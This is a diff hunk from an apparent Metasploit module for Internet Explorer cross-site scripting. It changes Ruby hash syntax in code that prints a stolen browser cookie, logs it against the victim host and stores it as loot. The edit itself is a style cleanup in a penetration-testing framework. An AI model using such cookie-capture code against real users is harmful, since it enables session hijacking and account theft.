@@ -141,9 +141,9 @@ class Metasploit3 < Msf::Auxiliary
         print_status("Got cookie")
         print_line(data)
         report_note(
-          :host => cli.peerhost,
-          :type => 'ie.cookie',
-          :data => data
+          host: cli.peerhost,
+          type: 'ie.cookie',
+          data: data
         )
         path = store_loot('ie_uxss_cookie', "text/plain", cli.peerhost, data, "#{cli.peerhost}_ie_cookie.txt", "IE Cookie")
         vprint_good("Cookie stored as: #{path}")
